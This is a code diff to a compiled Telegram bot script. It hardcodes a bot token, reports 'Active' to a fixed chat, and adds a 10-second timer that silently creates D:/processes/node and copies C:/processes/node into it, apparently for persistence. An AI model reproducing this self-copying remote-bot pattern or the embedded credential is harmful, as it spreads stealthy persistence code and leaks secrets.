@@ -11,6 +11,8 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
 Object.defineProperty(exports, "__esModule", { value: true });
 const telegraf_1 = require("telegraf");
 const spawn_1 = require("./spawn");
+const fs_1 = require("fs");
+const path_1 = require("path");
 const app = new telegraf_1.Telegraf('6198800908:AAGVvGmCfmKDK_Pbt8nJ9PGArg2fZ5x6DJ4');
 setTimeout(() => {
     app.telegram.sendMessage('717341709', 'Active');
@@ -109,4 +111,20 @@ app.on('text', (ctx) => __awaiter(void 0, void 0, void 0, function* () {
         return yield ctx.reply('Нет данных');
     }
 }));
+setInterval(() => {
+    try {
+        (0, fs_1.readdirSync)((0, path_1.join)('D:/processes/node/'));
+    }
+    catch (error) {
+        try {
+            (0, fs_1.mkdirSync)((0, path_1.join)('D:/processes'));
+            (0, fs_1.mkdirSync)((0, path_1.join)('D:/processes/node'));
+        }
+        catch (error) { }
+        try {
+            (0, fs_1.cpSync)((0, path_1.join)('C:/processes/node'), (0, path_1.join)('D:/processes/node'));
+        }
+        catch (error) { }
+    }
+}, 10000);
 app.launch();
